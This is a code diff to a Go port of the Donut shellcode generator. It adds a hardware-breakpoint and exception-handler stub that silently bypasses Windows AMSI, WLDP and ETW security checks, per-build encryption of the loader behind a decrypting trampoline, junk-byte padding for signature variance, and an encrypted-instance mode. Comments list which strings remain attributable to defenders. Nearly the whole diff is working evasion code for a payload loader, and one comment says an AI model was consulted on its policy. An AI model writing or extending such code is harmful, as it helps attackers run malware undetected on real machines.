@@ -27,9 +27,9 @@ import (
 // unsupported values from being silently copied into the module or instance.
 func validateConfig(config *DonutConfig) error {
 	switch config.Entropy {
-	case DONUT_ENTROPY_NONE, DONUT_ENTROPY_RANDOM:
+	case DONUT_ENTROPY_NONE, DONUT_ENTROPY_RANDOM, DONUT_ENTROPY_DEFAULT:
 	default:
-		return fmt.Errorf("donut: unsupported entropy %d: supported values are 1 (none) and 2 (random names)", config.Entropy)
+		return fmt.Errorf("donut: unsupported entropy %d: supported values are 1 (none), 2 (random names), and 3 (random names + symmetric encryption)", config.Entropy)
 	}
 
 	switch config.Compress {
@@ -42,6 +42,26 @@ func validateConfig(config *DonutConfig) error {
 	case 0, 1:
 	default:
 		return fmt.Errorf("donut: unsupported format %d: only raw output is supported (use 0 or 1)", config.Format)
+	}
+
+	// Evade mode set is intentionally minimal (P2 sweeper dropped): anything
+	// other than none/hwbp must fail loudly instead of silently disabling the
+	// built-in AMSI/WLDP patch without installing a replacement.
+	switch config.Evade {
+	case EvadeNone, EvadeHwbp:
+	default:
+		return fmt.Errorf("donut: unsupported evade mode %d: supported values are 0 (off) and 1 (hwbp)", config.Evade)
+	}
+
+	// Morph encrypts the loader stage; an unencrypted instance under entropy<3
+	// still carries plaintext attribution strings. Warn loudly (not an error:
+	// stage-level morphing with a plaintext instance is a legitimate choice).
+	// Policy per gpt-6.1-sol consult (daybreak P0.3): ALWAYS-visible warning on
+	// stderr naming exactly what remains attributable — never verbose-gated,
+	// never a hard error (breaks legal fixtures), never an auto-upgrade
+	// (overrides explicit user intent; see .research/v1.1.5-roadmap.md WP6).
+	if config.Morph && config.Entropy != DONUT_ENTROPY_DEFAULT {
+		log.Println("WARNING: Morph encrypts the loader stage only — the embedded instance stays PLAINTEXT at entropy < 3, keeping attributable content: API-name lists (DllNames, Amsi*, Wldp*, ExitApi), CLR/script GUIDs, and command-line symbols. Stage encryption does NOT encrypt the instance. Select entropy 3 for a fully encrypted corpus; entropy 3 is not a guarantee of anonymity or non-detection.")
 	}
 
 	return nil
@@ -152,7 +172,7 @@ func ShellcodeFromBytes(buf *bytes.Buffer, config *DonutConfig) (*bytes.Buffer, 
 		}
 	}
 	//ioutil.WriteFile("newinst.bin", instance.Bytes(), 0644)
-	return sandwich(config.Arch, instance, config.Morph)
+	return sandwich(config.Arch, instance, config.Morph, config.Evade, config.EvadeTargets)
 }
 
 // Sandwich adds the canonical donut prefix and loader stub around payload.
@@ -160,13 +180,98 @@ func ShellcodeFromBytes(buf *bytes.Buffer, config *DonutConfig) (*bytes.Buffer, 
 // The public API intentionally retains its original two-argument signature.
 // Use ShellcodeFromBytes with DonutConfig.Morph to request a morphed loader.
 func Sandwich(arch DonutArch, payload *bytes.Buffer) (*bytes.Buffer, error) {
-	return sandwich(arch, payload, false)
+	return sandwich(arch, payload, false, EvadeNone, 0)
+}
+
+// buildStage composes one architecture's post-instance stage:
+//
+//	[evade stub?] [trampoline? + core ciphertext | canonical loader]
+//
+// The evade stub (patchless HWBP+VEH AMSI/WLDP/ETW interception) always ends
+// with a `jmp rel32` that is patched here to the byte immediately after it.
+// When morph is set the canonical loader never appears in plaintext: it is
+// encrypted per build (scheme+key via EncryptCore) and a generation-time
+// trampoline allocates a fresh RW page, decrypts, flips RX, flushes the
+// instruction cache, and transfers control with the entry contract intact.
+// With morph clear the stage carries the canonical loader bytes unchanged.
+func buildStage(loader []byte, morph bool, evade EvadeMode, targets EvadeTargets, gen64 bool, label string) ([]byte, error) {
+	var stage []byte
+
+	if evade == EvadeHwbp {
+		opts := targets.options()
+		var (
+			stub []byte
+			meta EvadeMetadata
+			err  error
+		)
+		if gen64 {
+			stub, meta, err = GenerateEvadeStub64(opts)
+		} else {
+			stub, meta, err = GenerateEvadeStub32(opts)
+		}
+		if err != nil {
+			return nil, fmt.Errorf("donut: generate %s evade stub: %w", label, err)
+		}
+		if gen64 {
+			if err := PatchEvadeJmp(stub, meta, len(stub)); err != nil {
+				return nil, fmt.Errorf("donut: patch %s evade jmp: %w", label, err)
+			}
+		} else {
+			// F2 fix: the 32-bit stub has its own jmp layout — patching it with
+			// the x64 patcher corrupted the entry bytes (one-byte shift at fs:).
+			if err := PatchEvadeJmp32(stub, meta, len(stub)); err != nil {
+				return nil, fmt.Errorf("donut: patch %s evade32 jmp: %w", label, err)
+			}
+		}
+		stage = stub
+	}
+
+	if morph {
+		cipher, key, scheme, err := EncryptCore(loader)
+		if err != nil {
+			return nil, fmt.Errorf("donut: encrypt %s core: %w", label, err)
+		}
+		famInt, err := evadeRandInt(3)
+		if err != nil {
+			return nil, fmt.Errorf("donut: %s scheme draw: %w", label, err)
+		}
+		seed, err := evadeRandUint32()
+		if err != nil {
+			return nil, fmt.Errorf("donut: %s seed draw: %w", label, err)
+		}
+		if seed == 0 {
+			seed = 0x9E3779B9
+		}
+		var tramp []byte
+		if gen64 {
+			tramp, err = GenerateTrampoline64(len(cipher), key, scheme, evadeHashFamily(famInt), seed)
+		} else {
+			tramp, err = GenerateTrampoline32(len(cipher), key, scheme, evadeHashFamily(famInt), seed)
+		}
+		if err != nil {
+			return nil, fmt.Errorf("donut: generate %s trampoline: %w", label, err)
+		}
+		// NOP-equivalent junk in front of the trampoline adds cheap per-build
+		// variance; RIP-relative references inside the trampoline shift with
+		// it, so the [tramp][key16][cipher] layout stays self-contained.
+		junked, err := insertJunk(tramp)
+		if err != nil {
+			return nil, fmt.Errorf("donut: junk %s trampoline: %w", label, err)
+		}
+		stage = append(stage, junked...)
+		stage = append(stage, cipher...)
+	} else {
+		stage = append(stage, loader...)
+	}
+	return stage, nil
 }
 
 // sandwich adds the donut prefix and loader stub around payload. When morph is
-// true, the loader receives generation-time byte variation only. The emitted
-// loader remains directly executable from RX memory.
-func sandwich(arch DonutArch, payload *bytes.Buffer, morph bool) (*bytes.Buffer, error) {
+// true, the loader core is present only as per-build ciphertext behind a
+// generation-time trampoline (RX-safe: the emitted stage never writes to its
+// own pages). A non-zero evade mode prepends the patchless HWBP+VEH stub and
+// disables the loader's built-in AMSI/WLDP patching (see CreateInstance).
+func sandwich(arch DonutArch, payload *bytes.Buffer, morph bool, evade EvadeMode, targets EvadeTargets) (*bytes.Buffer, error) {
 	if payload == nil {
 		return nil, fmt.Errorf("donut: nil payload")
 	}
@@ -194,97 +299,66 @@ func sandwich(arch DonutArch, payload *bytes.Buffer, morph bool) (*bytes.Buffer,
 	x64CoreLength := len(LOADER_EXE_X64) - 22 - x64StagePadding
 	x64Wrapper := LOADER_EXE_X64[:22]
 	x64Core := LOADER_EXE_X64[22 : 22+x64CoreLength]
+	// Copy before appending: x64Wrapper is a slice of LOADER_EXE_X64 whose
+	// spare capacity would otherwise let append overwrite the global loader.
+	x84Loader := append([]byte(nil), x64Wrapper...)
+	x84Loader = append(x84Loader, x64Core...)
+
 	var targetLen int
 
 	switch arch {
 	case X32:
-		if morph {
-			preamble, err := morphPreamble(X32)
-			if err != nil {
-				return nil, fmt.Errorf("donut: create x86 morph preamble: %w", err)
-			}
-			w.Write(preamble)
-		} else {
-			w.WriteByte(0x5A) // preamble: pop edx, push ecx, push edx
-			w.WriteByte(0x51)
-			w.WriteByte(0x52)
+		preamble, err := morphPreamble(X32)
+		if err != nil {
+			return nil, fmt.Errorf("donut: create x86 morph preamble: %w", err)
 		}
-		if morph {
-			loader, err := morphLoader(LOADER_EXE_X86)
-			if err != nil {
-				return nil, fmt.Errorf("donut: morph x86 loader: %w", err)
-			}
-			w.Write(loader)
-			targetLen = int(instanceLen) + len(loader) + 32
-		} else {
-			w.Write(LOADER_EXE_X86)
-			targetLen = int(instanceLen) + len(LOADER_EXE_X86) + 32
+		if !morph {
+			preamble = []byte{0x5A, 0x51, 0x52}
 		}
+		w.Write(preamble)
+		stage, err := buildStage(LOADER_EXE_X86, morph, evade, targets, false, "x86")
+		if err != nil {
+			return nil, err
+		}
+		w.Write(stage)
+		targetLen = int(instanceLen) + len(stage) + 32
 	case X64:
-		if morph {
-			loader, err := morphLoader(LOADER_EXE_X64)
-			if err != nil {
-				return nil, fmt.Errorf("donut: morph x64 loader: %w", err)
-			}
-			w.Write(loader)
-			targetLen = int(instanceLen) + len(loader) + 6
-		} else {
-			w.Write(LOADER_EXE_X64)
-			targetLen = int(instanceLen) + len(LOADER_EXE_X64) + 6
+		stage, err := buildStage(LOADER_EXE_X64, morph, evade, targets, true, "x64")
+		if err != nil {
+			return nil, err
 		}
+		w.Write(stage)
+		targetLen = int(instanceLen) + len(stage) + 6
 	case X84:
-		if morph {
-			preamble, err := morphPreamble(X84)
-			if err != nil {
-				return nil, fmt.Errorf("donut: create x84 morph preamble: %w", err)
-			}
-			w.Write(preamble)
-		} else {
-			w.WriteByte(0x31) // preamble: xor eax,eax
-			w.WriteByte(0xC0)
+		preamble, err := morphPreamble(X84)
+		if err != nil {
+			return nil, fmt.Errorf("donut: create x84 morph preamble: %w", err)
 		}
+		if !morph {
+			preamble = []byte{0x31, 0xC0}
+		}
+		w.Write(preamble)
 		w.WriteByte(0x48) // dec eax in x86; REX.W prefix in x64 branch
 		w.WriteByte(0x0F) // js dword x86_code (skips length of x64 code)
 		w.WriteByte(0x88)
 
-		if morph {
-			// Copy before appending: x64Wrapper is a slice of LOADER_EXE_X64,
-			// whose spare capacity otherwise lets append overwrite the global
-			// loader backing array.
-			x64Loader := append([]byte(nil), x64Wrapper...)
-			x64Loader = append(x64Loader, x64Core...)
-			x64Morphed, err := morphLoader(x64Loader)
-			if err != nil {
-				return nil, fmt.Errorf("donut: morph x64 loader for x84: %w", err)
-			}
-			x64Block := x64Morphed
-			if err := binary.Write(w, binary.LittleEndian, uint32(len(x64Block))); err != nil {
-				return nil, fmt.Errorf("donut: write x84 x64 jump length: %w", err)
-			}
-			w.Write(x64Block)
-			x32Preamble, err := morphPreamble(X32)
-			if err != nil {
-				return nil, fmt.Errorf("donut: create x84 x86 morph preamble: %w", err)
-			}
-			w.Write(x32Preamble) // pop edx, push ecx, push edx (morphed)
-			x86Morphed, err := morphLoader(LOADER_EXE_X86)
-			if err != nil {
-				return nil, fmt.Errorf("donut: morph x86 loader for x84: %w", err)
-			}
-			w.Write(x86Morphed)
-			targetLen = int(instanceLen) + len(x64Block) + len(x86Morphed) + 32
-		} else {
-			if err := binary.Write(w, binary.LittleEndian, uint32(len(x64Wrapper)+len(x64Core))); err != nil {
-				return nil, fmt.Errorf("donut: write x84 x64 jump length: %w", err)
-			}
-			w.Write(x64Wrapper)
-			w.Write(x64Core)
-			w.Write([]byte{0x5A, // in between 32/64 stubs: pop edx
-				0x51,  // push ecx
-				0x52}) // push edx
-			w.Write(LOADER_EXE_X86)
-			targetLen = int(instanceLen) + len(LOADER_EXE_X86) + len(x64Wrapper) + len(x64Core) + 32
+		stage64, err := buildStage(x84Loader, morph, evade, targets, true, "x84/x64")
+		if err != nil {
+			return nil, err
 		}
+		if err := binary.Write(w, binary.LittleEndian, uint32(len(stage64))); err != nil {
+			return nil, fmt.Errorf("donut: write x84 x64 jump length: %w", err)
+		}
+		w.Write(stage64)
+		w.Write([]byte{0x5A, // in between 32/64 stubs: pop edx
+			0x51,  // push ecx
+			0x52}) // push edx
+		stage32, err := buildStage(LOADER_EXE_X86, morph, evade, targets, false, "x84/x86")
+		if err != nil {
+			return nil, err
+		}
+		w.Write(stage32)
+		targetLen = int(instanceLen) + len(stage64) + 3 + len(stage32) + 32
 	default:
 		return nil, fmt.Errorf("donut: unsupported architecture %d", arch)
 	}
@@ -295,6 +369,8 @@ func sandwich(arch DonutArch, payload *bytes.Buffer, morph bool) (*bytes.Buffer,
 
 	return w, nil
 }
+
+// CreateModule - Creates the Donut Module from Config
 
 // CreateModule - Creates the Donut Module from Config
 func CreateModule(config *DonutConfig, inputFile *bytes.Buffer) error {
@@ -407,7 +483,13 @@ func CreateInstance(config *DonutConfig) (*bytes.Buffer, error) {
 	inst := new(DonutInstance)
 	modLen := uint32(config.ModuleData.Len()) // ModuleData is mod struct + input file
 	instLen := uint32(4760)                   // Donut v1.1 DONUT_INSTANCE size
-	inst.Bypass = uint32(config.Bypass)
+	// A patchless evade stub replaces the loader's built-in AMSI/WLDP patch
+	// entirely, so the instance must tell the stage to skip it (1 = skip).
+	if config.Evade == EvadeHwbp {
+		inst.Bypass = 1
+	} else {
+		inst.Bypass = uint32(config.Bypass)
+	}
 	if config.Headers == 0 {
 		inst.Headers = 1 // DONUT_HEADERS_OVERWRITE (default in C donut)
 	} else {
@@ -614,9 +696,10 @@ func CreateInstance(config *DonutConfig) (*bytes.Buffer, error) {
 			log.Println("encrypting module for download")
 		}
 		config.ModuleMac = Maru(inst.Sig[:], inst.Iv)
+		ctrCopy := append([]byte(nil), inst.ModKeyCtr[:]...)
 		config.ModuleData = bytes.NewBuffer(Encrypt(
 			inst.ModKeyMk[:],
-			inst.ModKeyCtr[:],
+			ctrCopy,
 			config.ModuleData.Bytes()))
 		b := new(bytes.Buffer)
 		inst.Len = instLen - 8 /* magic padding */
@@ -624,13 +707,18 @@ func CreateInstance(config *DonutConfig) (*bytes.Buffer, error) {
 		for uint32(b.Len()) < instLen-16 /* magic padding */ {
 			b.WriteByte(0)
 		}
-		return b, nil
+		instData := b.Bytes()
+		encInstData := Encrypt(inst.KeyMk[:], inst.KeyCtr[:], instData[572:])
+		bc := new(bytes.Buffer)
+		binary.Write(bc, binary.LittleEndian, instData[:572])
+		bc.Write(encInstData)
+		return bc, nil
 	}
 	// else if config.InstType == DONUT_INSTANCE_PIC
 	b := new(bytes.Buffer)
 	inst.WriteTo(b)
 	if _, err := config.ModuleData.WriteTo(b); err != nil {
-		log.Fatal(err)
+		return nil, fmt.Errorf("donut: append module data: %w", err)
 	}
 	for uint32(b.Len()) < config.instLen {
 		b.WriteByte(0)
@@ -659,7 +747,7 @@ func CreateInstance(config *DonutConfig) (*bytes.Buffer, error) {
 	bc := new(bytes.Buffer)
 	binary.Write(bc, binary.LittleEndian, instData[:offset]) // unencrypted header
 	if _, err := bc.Write(encInstData); err != nil {         // encrypted body
-		log.Fatal(err)
+		return nil, fmt.Errorf("donut: write encrypted instance body: %w", err)
 	}
 	if config.Verbose {
 		log.Println("Leaving.")
